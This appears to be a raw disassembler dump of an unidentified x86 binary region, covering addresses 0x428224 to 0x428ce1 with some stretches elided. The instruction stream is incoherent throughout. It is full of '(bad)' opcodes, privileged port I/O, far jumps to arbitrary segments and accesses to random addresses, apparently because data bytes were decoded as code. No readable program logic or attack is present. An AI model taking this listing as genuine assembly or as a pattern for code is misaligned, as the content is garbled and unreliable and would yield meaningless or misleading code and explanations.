  428224:	or     BYTE PTR [esi+0x33],cl
  428227:	pusha  
  428228:	cmp    bl,dh
  42822a:	mov    ch,0xb7
  42822c:	hlt    
  42822d:	lea    esi,[esi]
  42822f:	push   ebp
  428230:	addr16 std 
  428232:	pop    ebp
  428233:	inc    bp
  428235:	xor    dh,BYTE PTR [esi+ecx*4]
  428238:	pusha  
  428239:	jl     0x4281ee
  42823b:	sub    al,0x7e
  42823d:	es xor al,0x7c
  428240:	mov    eax,ds:0x1950e54a
  428245:	and    al,0x6d
  428247:	cmp    ah,BYTE PTR [ecx+0x5f]
  42824a:	xchg   ecx,eax
  42824b:	call   0xfd0f4804
  428250:	cmp    ch,dl
  428252:	jae    0x4282bb
  428254:	std    
  428255:	xchg   esp,eax
  428256:	sub    eax,0x803f93b
  42825b:	xor    eax,0x22bd4414
  428260:	lods   al,BYTE PTR ds:[esi]
  428261:	mov    esp,0xf338639
  428266:	retf   
  428267:	imul   BYTE PTR [edi]
  428269:	mov    al,0x1c
  42826b:	rol    BYTE PTR [esi],1
  42826d:	mov    cl,0x3e
  42826f:	nop
  428270:	or     al,0x60
  428272:	in     al,0x79
  428274:	xor    eax,0x517aec33
  428279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42827a:	mov    esi,0x3c1ee860
  42827f:	and    ebp,DWORD PTR gs:[ebp+0x459910f5]
  428286:	mov    WORD PTR [ebx+0x2],gs
  428289:	sti    
  42828a:	cmp    cl,dh
  42828c:	fidiv  DWORD PTR [edi]
  42828e:	sbb    DWORD PTR [ebx+0xa02e553],eax
  428294:	hlt    
  428295:	xchg   edx,eax
  428296:	ret    0xc0a1
  428299:	xchg   ebx,eax
  42829a:	imul   esi,DWORD PTR [ebp-0x2],0x62
  42829e:	sub    edx,DWORD PTR [eax-0x25]
  4282a1:	lds    edx,FWORD PTR [eax]
  4282a3:	jb     0x4282a8
  4282a5:	in     eax,0x5d
  4282a7:	(bad)  [eax-0x80]
  4282aa:	icebp  
  4282ab:	mov    esp,DWORD PTR [edi]
  4282ad:	sub    ecx,DWORD PTR [edi+0x72]
  4282b0:	dec    ecx
  4282b1:	test   BYTE PTR [eax-0x5f],dl
  4282b4:	push   edi
  4282b5:	xor    ebx,edi
  4282b7:	inc    esp
  4282b8:	inc    edi
  4282b9:	pop    esi
  4282ba:	mov    dh,0x68
  4282bc:	adc    BYTE PTR [ecx],dl
  4282be:	jno    0x42825d
  4282c0:	sar    eax,0xa0
  4282c3:	sbb    BYTE PTR [ebp-0x7fac26f],0x34
  4282ca:	icebp  
  4282cb:	and    al,0xd0
  4282cd:	ja     0x428280
  4282cf:	push   ss
  4282d0:	xchg   edx,eax
  4282d1:	sbb    BYTE PTR [eax+0x6b],0x55
  4282d5:	push   ebx
  4282d6:	data16 sub BYTE PTR [ecx-0x5c8007dc],al
  4282dd:	scas   al,BYTE PTR es:[edi]
  4282de:	mov    ebx,0x7ede4f69
  4282e3:	or     al,0x90
  4282e5:	xchg   ecx,eax
  4282e6:	rol    DWORD PTR [ebx+0x6c661b25],0xa0
	...
  428355:	add    bh,al
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	mov    cl,0x71
  428364:	popa   
  428365:	ror    BYTE PTR [edi-0xfffe52],cl
  42836b:	add    BYTE PTR [eax],al
  42836d:	add    BYTE PTR [ebx-0x18fbb8a2],bh
  428373:	retf   
  428374:	cwde   
  428375:	js     0x428359
  428377:	mov    esi,DWORD PTR [edi-0x2f]
  42837a:	cld    
  42837b:	and    ah,BYTE PTR [eax-0x1869eb1c]
  428381:	mov    ecx,0x5eff7346
  428386:	cmp    eax,0x10d1c3d4
  42838b:	mov    dl,0x88
  42838d:	lods   eax,DWORD PTR ds:[esi]
  42838e:	cli    
  42838f:	and    cl,al
  428391:	ins    DWORD PTR es:[edi],dx
  428392:	push   esp
  428393:	mov    fs,ebx
  428395:	or     al,0xe9
  428397:	push   es
  428398:	push   esi
  428399:	not    DWORD PTR [ebx+0x1a385c6e]
  42839f:	and    BYTE PTR [edx+edx*8-0x73bbb02],dh
  4283a6:	inc    edi
  4283a7:	adc    eax,0xd17a1c9
  4283ac:	dec    esi
  4283ad:	cs jns 0x42834f
  4283b0:	scas   eax,DWORD PTR es:[edi]
  4283b1:	mov    ah,0x8d
  4283b3:	mov    ds:0x1f8df65b,al
  4283b8:	repz test BYTE PTR [esi-0x36],dh
  4283bc:	(bad)  
  4283be:	std    
  4283bf:	cld    
  4283c0:	mov    dh,0x59
  4283c2:	push   eax
  4283c3:	stos   DWORD PTR es:[edi],eax
  4283c4:	mov    ch,0x60
  4283c6:	(bad)  
  4283c7:	jns    0x42839e
  4283c9:	dec    ecx
  4283ca:	shl    BYTE PTR [eax],cl
  4283cc:	lods   eax,DWORD PTR ds:[esi]
  4283cd:	scas   ax,WORD PTR es:[edi]
  4283cf:	pop    es
  4283d0:	(bad)  
  4283d1:	sbb    DWORD PTR [eax+0x73],esp
  4283d4:	ds dec edi
  4283d6:	or     ebx,ecx
  4283d8:	adc    eax,0x5770095a
  4283dd:	mov    ?,WORD PTR [edi-0x3c894b2c]
  4283e3:	cli    
  4283e4:	cld    
  4283e5:	jge    0x4283d2
  4283e7:	aas    
  4283e8:	or     BYTE PTR [ebx],0xde
  4283eb:	std    
  4283ec:	push   ds
  4283ed:	sub    al,0x95
  4283ef:	cmp    esi,DWORD PTR [ecx]
  4283f1:	sbb    BYTE PTR [ebx+0x44],bl
  4283f4:	push   edi
  4283f5:	mov    cs,eax
  4283f7:	sbb    al,0x1a
  4283f9:	lahf   
  4283fa:	sub    edi,DWORD PTR [eax-0x719066d1]
  428400:	dec    ecx
  428401:	ds adc eax,0x31fb8314
  428407:	mov    bh,0x11
  428409:	(bad)  
  42840a:	xor    eax,0x2d5b8df0
  42840f:	retf   0x4c9e
  428412:	cmp    esp,edx
  428414:	mov    eax,ds:0x890c4ef0
  428419:	and    al,0x1f
  42841b:	test   esi,ebp
  42841d:	sbb    al,0x4
  42841f:	pop    ebx
  428420:	mov    ?,WORD PTR [edx-0x2a2b274e]
  428426:	sbb    BYTE PTR [eax],0x74
  428429:	jae    0x42841d
  42842b:	cli    
  42842c:	push   edx
  42842d:	cwde   
  42842e:	(bad)  
  42842f:	jae    0x428411
  428431:	jns    0x428487
  428433:	inc    ebx
  428434:	int3   
  428435:	test   al,0x39
  428437:	push   ecx
  428438:	add    ch,dl
  42843a:	xchg   edi,eax
  42843b:	stos   DWORD PTR es:[edi],eax
  42843c:	xchg   ebx,eax
  42843d:	dec    ebp
  42843e:	jecxz  0x4284bf
  428440:	nop
  428441:	mov    cl,0xa2
  428443:	mov    dl,0xd2
  428445:	es jb  0x428498
  428448:	addr16 pop ebp
  42844a:	jg     0x428499
  42844c:	push   cs
  42844d:	out    dx,al
  42844e:	cmp    bl,BYTE PTR [eax+0x73f392f3]
  428454:	aaa    
  428455:	sar    BYTE PTR [eax-0x15],cl
  428458:	in     eax,dx
  428459:	mov    ecx,DWORD PTR ds:0xbc3f81d0
  42845f:	loopne 0x4284bf
  428461:	ret    
  428462:	(bad)  
  428463:	fdiv   QWORD PTR [edx+0x67]
  428466:	mov    bl,0x6f
  428468:	retf   0xa56f
  42846b:	aaa    
  42846c:	fild   WORD PTR [eax]
	...
  4284d6:	push   cs
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0xa0abfb32
  4284e3:	daa    
  4284e4:	mov    esi,DWORD PTR [edi-0x72]
  4284e7:	scas   eax,DWORD PTR es:[edi]
  4284e8:	add    DWORD PTR [eax],eax
  4284ea:	inc    DWORD PTR [eax]
  4284ec:	add    BYTE PTR [eax],al
  4284ee:	cwde   
  4284ef:	push   esi
  4284f0:	aas    
  4284f1:	enter  0xfbb1,0x6
  4284f5:	mov    eax,ds:0xe43d72ca
  4284fa:	xor    eax,0xec818a6a
  4284ff:	addr16 sbb al,0x7a
  428502:	dec    esp
  428503:	ins    DWORD PTR es:[edi],dx
  428504:	pop    ebp
  428505:	lds    eax,FWORD PTR [ebp-0x2423811e]
  42850b:	mov    edx,0x1d9a5ae0
  428510:	in     al,dx
  428511:	mov    al,ds:0x2f91496c
  428516:	iret   
  428517:	iret   
  428518:	hlt    
  428519:	or     BYTE PTR [esi],dl
  42851b:	cli    
  42851c:	mov    esp,0x8abc65b0
  428521:	retf   0xc413
  428524:	outs   dx,BYTE PTR ds:[esi]
  428525:	pop    edi
  428526:	jge    0x42858c
  428528:	xor    BYTE PTR [ebx-0x6c],ah
  42852b:	stos   DWORD PTR es:[edi],eax
  42852c:	xchg   esp,eax
  42852d:	call   0x5ee26dfa
  428532:	and    DWORD PTR [esi+0x5b14ca83],ebp
  428538:	jmp    0x4d7040c
  42853d:	xchg   ebp,eax
  42853e:	outs   dx,BYTE PTR ds:[esi]
  42853f:	mov    esi,0x7d749c59
  428544:	inc    ecx
  428545:	and    BYTE PTR [ebp+0x20],dl
  428548:	push   edi
  428549:	add    ch,BYTE PTR [edi]
  42854b:	cmc    
  42854c:	sub    DWORD PTR [eax-0x12b09c15],eax
  428552:	test   DWORD PTR [ebx+edx*2],ebp
  428555:	mov    bl,0xf
  428557:	mov    eax,ds:0x7e4f062b
  42855c:	mov    ds,WORD PTR ds:0x6e85ca00
  428562:	push   ebx
  428563:	stos   DWORD PTR es:[edi],eax
  428564:	mov    dh,0xd7
  428566:	(bad)  
  428568:	fadd   QWORD PTR [esi]
  42856a:	data16 out 0x78,al
  42856d:	xchg   ebx,eax
  42856e:	jl     0x428548
  428570:	sub    BYTE PTR [ecx-0x53],0x8e
  428574:	(bad)  
  428575:	ror    DWORD PTR [eax-0x4c],cl
  428578:	mov    edi,0x9a9ddf6c
  42857d:	pop    es
  42857e:	jne    0x42857e
  428580:	pop    ss
  428581:	sbb    bh,dl
  428583:	xlat   BYTE PTR ds:[ebx]
  428584:	ins    BYTE PTR es:[edi],dx
  428585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428586:	fst    st(0)
  428588:	sbb    BYTE PTR ds:0xaa872c25,0xe8
  42858f:	frstor ds:[eax]
  428592:	add    ah,bh
  428594:	imul   edx,ecx,0xbb4b013f
  42859a:	xor    BYTE PTR [edi+ebx*1],0x98
  42859e:	je     0x42852e
  4285a0:	xchg   ebx,eax
  4285a1:	and    ebx,DWORD PTR [ebx+0x66]
  4285a4:	or     BYTE PTR [esi],dh
  4285a6:	fcomi  st,st(1)
  4285a8:	jne    0x81c41777
  4285ae:	cli    
  4285af:	xor    eax,0xad32f4b6
  4285b4:	in     al,dx
  4285b5:	mov    cl,BYTE PTR [edx+edi*2]
  4285b8:	sbb    BYTE PTR [ecx+0x31],cl
  4285bb:	fs inc ebp
  4285bd:	popa   
  4285be:	lea    esp,[edi]
  4285c0:	shl    BYTE PTR [edi+0x38fdb5cd],1
  4285c6:	xchg   ebx,eax
  4285c7:	cwde   
  4285c8:	mov    al,BYTE PTR [eax]
  4285ca:	imul   edi,DWORD PTR [edi],0x79baded0
  4285d0:	and    BYTE PTR [ebx+0xb],dl
  4285d3:	test   al,0x42
  4285d5:	loop   0x428627
  4285d7:	xor    al,0xdd
  4285d9:	push   es
  4285da:	dec    eax
  4285db:	mov    esp,0x82197edb
  4285e0:	outs   dx,BYTE PTR ds:[esi]
  4285e1:	lea    ecx,[ecx+ecx*2-0xfddb728]
  4285e8:	fldenv [edi+0x64]
  4285eb:	sahf   
  4285ec:	pop    ecx
	...
  428655:	add    BYTE PTR [ecx-0xa],dl
  428658:	xor    eax,0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0xbdcba3f6
  428664:	dec    DWORD PTR [edi-0x73]
  428667:	mov    al,0x1
  428669:	add    bh,bh
  42866b:	add    BYTE PTR [eax],al
  42866d:	add    BYTE PTR [esi],dh
  42866f:	jecxz  0x42861e
  428671:	dec    edx
  428672:	sar    edi,cl
  428674:	arpl   WORD PTR [edi],di
  428676:	fmul   QWORD PTR [ebx]
  428678:	ror    BYTE PTR [esi],cl
  42867a:	xchg   edi,eax
  42867b:	pop    esi
  42867c:	fs mov esi,0xae1967f7
  428682:	repz out 0xdd,eax
  428685:	jge    0x4286ec
  428687:	or     DWORD PTR [eax+0x75],ebp
  42868a:	loop   0x428621
  42868c:	lea    ebp,[esi-0x57f330e3]
  428692:	sti    
  428693:	pop    ss
  428694:	jne    0x428702
  428696:	sbb    BYTE PTR [edi+esi*8],dh
  428699:	pop    es
  42869a:	or     dl,BYTE PTR [ecx+esi*4]
  42869d:	inc    ebx
  42869e:	lods   eax,DWORD PTR ds:[esi]
  42869f:	sahf   
  4286a0:	test   edx,edx
  4286a2:	mov    ebp,0x88e8c80f
  4286a7:	push   esi
  4286a8:	(bad)  
  4286a9:	call   0x31d19edd
  4286ae:	mov    DWORD PTR [ebx-0x40ae05bb],esp
  4286b4:	fistp  QWORD PTR [edx+esi*2+0x565bab8b]
  4286bb:	mov    esi,0x9460d4e8
  4286c0:	sahf   
  4286c1:	pop    esi
  4286c2:	(bad)  
  4286c3:	js     0x428650
  4286c5:	dec    eax
  4286c6:	or     al,0x58
  4286c8:	cs push ss
  4286ca:	stc    
  4286cb:	fsub   QWORD PTR [esi+edi*8]
  4286ce:	add    dh,BYTE PTR [ebp+0x6e]
  4286d1:	scas   eax,DWORD PTR es:[edi]
  4286d2:	(bad)  
  4286d3:	cmp    BYTE PTR [esi-0x73],bh
  4286d6:	fimul  WORD PTR [ebx+0x18]
  4286d9:	push   0x4a
  4286db:	sub    ebx,ebx
  4286dd:	mov    ch,0x8a
  4286df:	mov    edx,0xc0bce762
  4286e4:	or     ebp,edx
  4286e6:	pushw  0x4d
  4286e9:	cmc    
  4286ea:	adc    esp,ebx
  4286ec:	leave  
  4286ed:	cld    
  4286ee:	ja     0x4286e5
  4286f0:	xchg   esi,eax
  4286f1:	loop   0x428717
  4286f3:	and    al,0xe9
  4286f5:	int    0xdd
  4286f7:	cld    
  4286f8:	adc    ah,BYTE PTR [ebx+0x52]
  4286fb:	loop   0x4286e3
  4286fd:	mov    dh,0xa0
  4286ff:	push   ebx
  428700:	xor    DWORD PTR [ecx],esp
  428702:	and    BYTE PTR [eax+esi*4-0x48],ah
  428706:	cmp    edx,DWORD PTR [ebx+ebp*8-0x42]
  42870a:	jno    0x428727
  42870c:	js     0x428748
  42870e:	aas    
  42870f:	iret   
  428710:	sar    edi,0xa2
  428713:	je     0x428705
  428715:	clc    
  428716:	cwde   
  428717:	or     al,0xab
  428719:	lds    esi,FWORD PTR [esi+0x7e]
  42871c:	in     eax,dx
  42871d:	js     0x4286b9
  42871f:	or     BYTE PTR [esi],0x40
  428722:	call   0x5940:0xc77f32fb
  428729:	pop    edi
  42872a:	mov    ah,BYTE PTR ds:0xd67b64b8
  428730:	adc    eax,0x185f5ed6
  428735:	enter  0xa139,0x74
  428739:	xlat   BYTE PTR ds:[ebx]
  42873a:	lea    eax,[ecx+0x4f1955f8]
  428740:	inc    ebp
  428741:	sbb    dh,dh
  428743:	int3   
  428744:	ds (bad) 
  428746:	mov    edi,0x4709cdea
  42874b:	daa    
  42874c:	in     al,0x2d
  42874e:	arpl   WORD PTR [ebp-0x6f],dx
  428751:	retf   0x2268
  428754:	in     al,0x90
  428756:	jg     0x4287b1
  428758:	fisubr WORD PTR [ebp-0x70]
  42875b:	push   ebp
  42875c:	cmp    al,0xb4
  42875e:	daa    
  42875f:	fld    QWORD PTR [ebx+0x50aca2b1]
  428765:	jmp    0x9f9f:0x9e26162b
  42876c:	sbb    BYTE PTR [eax],al
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x7b1107f8
  4287e5:	ja     0x428773
  4287e7:	mov    cl,0x1
  4287e9:	add    bh,bh
  4287eb:	add    BYTE PTR [eax],al
  4287ed:	add    BYTE PTR [edi-0x7e],ch
  4287f0:	cmp    dh,BYTE PTR [esp+edx*8+0x57]
  4287f4:	lahf   
  4287f5:	push   0x4
  4287f7:	mov    ds:0xb0ab0c82,eax
  4287fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287fe:	cdq    
  4287ff:	add    BYTE PTR [esi+0x32958996],0x7
  428806:	fsubr  st,st(1)
  428808:	inc    esi
  428809:	xlat   BYTE PTR ds:[ebx]
  42880a:	adc    cl,BYTE PTR [ecx+0x28]
  42880d:	les    edi,FWORD PTR [edi-0x48]
  428810:	xchg   ebp,eax
  428811:	fsubr  st,st(7)
  428813:	xchg   edi,eax
  428814:	scas   eax,DWORD PTR es:[edi]
  428815:	(bad)  
  428816:	dec    ebp
  428817:	push   DWORD PTR [esi+0x60]
  42881a:	ds mov fs,edi
  42881d:	sbb    ecx,DWORD PTR [ecx+ebp*2+0x6a]
  428821:	and    edi,DWORD PTR ds:[eax-0x6]
  428825:	ss dec ebp
  428827:	xchg   BYTE PTR ds:0xe5aebf7c,cl
  42882d:	add    BYTE PTR [eax+0x3e],0xc0
  428831:	int3   
  428832:	mov    bl,0x5
  428834:	(bad)  
  428835:	or     BYTE PTR ds:0x20fa10ac,ch
  42883b:	rol    BYTE PTR [ebx],cl
  42883d:	xchg   edi,eax
  42883e:	xor    DWORD PTR [ecx-0x5a],eax
  428841:	out    dx,al
  428842:	pop    ss
  428843:	xor    al,0x36
  428845:	inc    edx
  428846:	imul   esp,DWORD PTR [edi+edi*1+0x2eb5ab0b],0x6706307b
  428851:	mov    eax,ds:0x3ec936bb
  428856:	mov    ch,0x97
  428858:	cmp    DWORD PTR [esi],eax
  42885a:	xor    DWORD PTR [ecx+eax*1+0x3905945d],0x408b542c
  428865:	pop    ebp
  428866:	xchg   DWORD PTR [esi-0xcbd29a7],edx
  42886c:	mov    ah,0xff
  42886e:	xchg   ebp,eax
  42886f:	pop    ebp
  428870:	mov    esp,0x26fbfc0f
  428875:	adc    ebp,0x701c96ea
  42887b:	iret   
  42887c:	push   esi
  42887d:	data16 loopne 0x428833
  428880:	mov    bh,0x7e
  428882:	mov    eax,0xb865c12a
  428887:	xchg   eax,ebp
  428889:	jl     0x4288a4
  42888b:	adc    edx,DWORD PTR [edi+0x305501d4]
  428891:	das    
  428892:	stc    
  428893:	mov    esi,0x8826ac5a
  428898:	lods   eax,DWORD PTR ds:[esi]
  428899:	sub    esp,edi
  42889b:	cdq    
  42889c:	stos   BYTE PTR es:[edi],al
  42889d:	add    ah,BYTE PTR [edx]
  42889f:	mov    DWORD PTR [ebx],0x6365af5f
  4288a5:	aad    0x69
  4288a7:	fwait
  4288a8:	push   eax
  4288a9:	fild   DWORD PTR [edx+0xbcbf6dc]
  4288af:	adc    BYTE PTR [ecx+0x36],0x70
  4288b3:	sbb    BYTE PTR [ebx],0xe9
  4288b6:	mov    ds:0x1067abf1,al
  4288bb:	push   edx
  4288bc:	(bad)  
  4288bd:	adc    al,0xa6
  4288bf:	push   edx
  4288c0:	mov    ebx,0x7eacc0eb
  4288c5:	test   eax,0xb1acbdab
  4288ca:	mov    eax,ds:0xfb3e8bea
  4288cf:	fstp   st(1)
  4288d1:	in     al,dx
  4288d2:	test   DWORD PTR ds:0x15bbaf0d,ecx
  4288d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4288d9:	aaa    
  4288da:	jae    0x4288dc
  4288dc:	jmp    esp
  4288de:	adc    esp,DWORD PTR [edx]
  4288e0:	push   ecx
  4288e1:	or     DWORD PTR [eax+0x241e6dc3],0x2444ecbc
  4288eb:	and    eax,0xef
	...
  428954:	add    BYTE PTR [eax],al
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi+0x12259d0f],bx
  428964:	jnp    0x42897a
  428966:	mov    esi,DWORD PTR [edx+0xff0001]
  42896c:	add    BYTE PTR [eax],al
  42896e:	iret   
  42896f:	xchg   ecx,eax
  428970:	mov    bh,0x76
  428972:	mov    DWORD PTR [edi-0x10],0x3f12b66
  428979:	stc    
  42897a:	or     esp,DWORD PTR [ebx+eiz*4+0x50]
  42897e:	pop    edi
  42897f:	dec    esp
  428980:	(bad)  
  428981:	mov    ah,0x5
  428983:	js     0x428906
  428985:	mov    ss,ebx
  428987:	sbb    ebx,DWORD PTR [ebp+0x37e74975]
  42898d:	aas    
  42898e:	push   ebx
  42898f:	dec    edx
  428990:	xchg   esi,eax
  428991:	sti    
  428992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428993:	jmp    0x7332:0x62a8d712
  42899a:	and    eax,0x6b4c90e8
  42899f:	cmp    eax,0xcf32ef1d
  4289a4:	ins    BYTE PTR es:[edi],dx
  4289a5:	pop    eax
  4289a6:	into   
  4289a7:	pop    edi
  4289a8:	pusha  
  4289a9:	fidiv  DWORD PTR [ebp-0x6f2d2731]
  4289af:	(bad)  
  4289b0:	ss test al,0x72
  4289b3:	mov    ebp,eax
  4289b5:	leave  
  4289b6:	js     0x428a07
  4289b8:	mov    BYTE PTR [eax+edi*2],0x1c
  4289bc:	mov    edi,0x3bf6cb98
  4289c1:	div    BYTE PTR [eax+edi*1+0x67723292]
  4289c8:	or     BYTE PTR [esi],0x1b
  4289cb:	push   esp
  4289cc:	call   FWORD PTR ds:0xf2b262f1
  4289d2:	mov    edx,0xf4c93a40
  4289d7:	out    dx,eax
  4289d8:	mov    bh,0xce
  4289da:	cdq    
  4289db:	out    dx,eax
  4289dc:	stc    
  4289dd:	popf   
  4289de:	sbb    eax,0x2503ab60
  4289e3:	inc    eax
  4289e4:	(bad)  
  4289e5:	into   
  4289e6:	push   edx
  4289e7:	xor    BYTE PTR [esi+0x47],cl
  4289ea:	mov    dl,0xba
  4289ec:	inc    ebp
  4289ed:	jmp    0x56fa9d83
  4289f2:	das    
  4289f3:	int3   
  4289f4:	(bad)  
  4289f5:	adc    eax,0xa3d0c625
  4289fa:	fist   WORD PTR [ebx+0x3bb8c6f6]
  428a00:	push   esp
  428a01:	or     esi,0xc89b9570
  428a07:	mov    dl,0x49
  428a09:	test   DWORD PTR [edi+edx*1+0x746e4a9d],ecx
  428a10:	mov    bh,0xb
  428a12:	imul   ebp,DWORD PTR [ecx],0xc8f90a6d
  428a18:	xchg   esi,eax
  428a19:	inc    esi
  428a1a:	outs   dx,DWORD PTR ds:[esi]
  428a1b:	add    esi,DWORD PTR ds:0x62a005f6
  428a21:	push   ss
  428a22:	and    BYTE PTR [edx+ebp*2-0x786fcd47],ch
  428a29:	cld    
  428a2a:	or     DWORD PTR [eax+0x1347ae3],ecx
  428a30:	sbb    edi,DWORD PTR [edi-0x7c]
  428a33:	mov    bh,0xa4
  428a35:	xor    eax,0x2535fbd6
  428a3a:	mov    al,ds:0x59c19f94
  428a3f:	push   ebx
  428a40:	popa   
  428a41:	mov    ah,0x8
  428a43:	cmc    
  428a44:	in     eax,0x5a
  428a46:	xchg   BYTE PTR fs:[eax-0x6],al
  428a4a:	test   eax,0x1c196082
  428a4f:	imul   ebp,DWORD PTR [eax-0x6a],0x20
  428a53:	sbb    esi,DWORD PTR [edx]
  428a55:	pop    ebx
  428a56:	popf   
  428a57:	sub    ah,BYTE PTR [ebx]
  428a59:	not    ah
  428a5b:	inc    eax
  428a5c:	dec    ebx
  428a5d:	outs   dx,DWORD PTR ds:[esi]
  428a5e:	push   0x73653ecf
  428a63:	mov    ds,WORD PTR [ebx]
  428a65:	push   ebx
  428a66:	push   edi
  428a67:	adc    eax,0x18385722
  428a6c:	jbe    0x428a6e
	...
  428ad6:	dec    ebp
  428ad7:	or     al,0xf8
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x125b6013]
  428ae5:	mov    eax,ds:0x1b38a
  428aea:	inc    DWORD PTR [eax]
  428aec:	add    BYTE PTR [eax],al
  428aee:	mov    esi,0x2e157e8b
  428af3:	push   cs
  428af4:	(bad)  
  428af5:	and    esi,esi
  428af7:	sahf   
  428af8:	into   
  428af9:	mov    ecx,0x978440de
  428afe:	loopne 0x428ab2
  428b00:	ror    BYTE PTR [edi-0x65a661b1],cl
  428b06:	sub    BYTE PTR [edx+ecx*2+0x181f242b],dh
  428b0d:	jns    0x428b84
  428b0f:	test   BYTE PTR [ebp+0x17bbcb51],cl
  428b15:	dec    esi
  428b16:	jnp    0x428b56
  428b18:	pop    es
  428b19:	xchg   BYTE PTR ds:0xac148324,dh
  428b1f:	and    eax,0x8e9ee6fc
  428b24:	fsub   DWORD PTR [ebx+0x5a]
  428b27:	mov    ?,WORD PTR [ecx+0x10]
  428b2a:	push   ds
  428b2b:	inc    BYTE PTR [ebx]
  428b2d:	add    BYTE PTR [ecx+0x49],ah
  428b30:	sahf   
  428b31:	push   edi
  428b32:	aam    0x35
  428b34:	pusha  
  428b35:	jb     0x428b31
  428b37:	in     eax,dx
  428b38:	sub    BYTE PTR [edi+0x2b],dl
  428b3b:	js     0x428b11
  428b3d:	add    DWORD PTR [eax*1+0x561517d1],ebp
  428b44:	fild   QWORD PTR [esi]
  428b46:	push   edx
  428b47:	call   0x173d91d8
  428b4c:	pop    esi
  428b4d:	fidiv  DWORD PTR [ebx+ebx*8-0x65]
  428b51:	mov    edx,0x42d6bccc
  428b56:	cdq    
  428b57:	(bad)  
  428b58:	js     0x428adf
  428b5a:	retf   0xc8c1
  428b5d:	sub    al,0xf8
  428b5f:	stos   BYTE PTR es:[edi],al
  428b60:	sahf   
  428b61:	dec    ecx
  428b62:	clc    
  428b63:	inc    esi
  428b64:	gs daa 
  428b66:	psrad  mm6,mm1
  428b69:	in     al,dx
  428b6a:	jns    0x428b7d
  428b6c:	and    eax,0x8c8dfa72
  428b71:	and    eax,0x6921b2a9
  428b76:	xchg   ebx,eax
  428b77:	adc    al,BYTE PTR [ebp+0x45f4dcae]
  428b7d:	mov    dh,0x3d
  428b7f:	xchg   ebp,edi
  428b81:	scas   al,BYTE PTR es:[edi]
  428b82:	cdq    
  428b83:	sbb    BYTE PTR [ebp+ecx*4+0x7865ba50],bh
  428b8a:	sub    al,0x7c
  428b8c:	es int3 
  428b8e:	push   0xffffffa1
  428b90:	arpl   bx,si
  428b92:	cmp    ch,BYTE PTR ss:[eax-0x78]
  428b96:	or     BYTE PTR [eax-0x42e9b2c9],al
  428b9c:	mov    ah,0x1b
  428b9e:	cld    
  428b9f:	repnz add eax,0xf45b01e0
  428ba5:	not    DWORD PTR [esi+0x6ae322ec]
  428bab:	inc    ebx
  428bac:	js     0x428ba8
  428bae:	sbb    ch,BYTE PTR [esi]
  428bb0:	aas    
  428bb1:	lds    ecx,FWORD PTR [edi-0x5a73ae67]
  428bb7:	lods   al,BYTE PTR ds:[esi]
  428bb8:	dec    esp
  428bb9:	aaa    
  428bba:	pop    ebp
  428bbb:	jle    0x428b62
  428bbd:	into   
  428bbe:	push   ecx
  428bbf:	hlt    
  428bc0:	fidiv  WORD PTR [eax-0x2ee00da2]
  428bc6:	adc    edi,DWORD PTR [edx+ebp*4+0x39]
  428bca:	jns    0x428b59
  428bcc:	shl    BYTE PTR [ecx-0x4b],cl
  428bcf:	(bad)  
  428bd0:	(bad)  
  428bd2:	les    ecx,FWORD PTR [edx-0x4e45005]
  428bd8:	cdq    
  428bd9:	test   eax,0xe415dbc6
  428bde:	in     eax,0x4f
  428be0:	dec    ebx
  428be1:	fidiv  DWORD PTR [ebp+0x1b]
  428be4:	adc    al,0x26
  428be6:	inc    ebp
  428be7:	out    dx,al
  428be8:	cs xor esi,ebx
  428beb:	adc    eax,0x76
	...
  428c54:	add    BYTE PTR [eax],al
  428c56:	lds    edx,FWORD PTR [ebp-0x76]
  428c59:	cli    
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x53ee7338
  428c66:	mov    DWORD PTR [ecx+eax*1+0xff00],esi
  428c6d:	add    BYTE PTR [esi+edi*2+0x68bf6def],bh
  428c74:	lods   eax,DWORD PTR ds:[esi]
  428c75:	fistp  DWORD PTR [ebx]
  428c77:	in     al,dx
  428c78:	jae    0x428c83
  428c7a:	or     DWORD PTR [ebx],ebx
  428c7c:	test   DWORD PTR [eax+0x668b1ba2],eax
  428c82:	xor    ebp,0x70
  428c85:	fistp  DWORD PTR [edx+0x26d0f59b]
  428c8b:	jg     0x428cc8
  428c8d:	adc    al,0x3e
  428c8f:	mov    eax,0xce66d0b0
  428c94:	pushf  
  428c95:	push   ecx
  428c96:	std    
  428c97:	or     DWORD PTR [ecx+0xfc6c018],esi
  428c9d:	gs call 0x5ffb:0x7d820270
  428ca5:	dec    edx
  428ca6:	(bad)  
  428ca7:	aam    0x62
  428ca9:	jae    0x428ca8
  428cab:	and    ebx,DWORD PTR [eax+0x3ffe5882]
  428cb1:	cdq    
  428cb2:	iret   
  428cb3:	push   0xb78d0d6a
  428cb8:	dec    edx
  428cb9:	fdiv   st,st(6)
  428cbb:	inc    edx
  428cbc:	test   ecx,ebp
  428cbe:	imul   eax,ecx,0x6a
  428cc1:	out    0x45,eax
  428cc3:	outs   dx,BYTE PTR ds:[esi]
  428cc4:	test   eax,0x348777cf
  428cc9:	or     bl,BYTE PTR [ebx]
  428ccb:	add    al,0x4b
  428ccd:	jnp    0x428d2c
  428ccf:	sub    cl,BYTE PTR [ecx-0x45]
  428cd2:	and    eax,0x42553333
  428cd7:	mov    eax,ds:0xc6fadabd
  428cdc:	mov    esi,0x31f96f33
  428ce1:	xchg   edx,eax
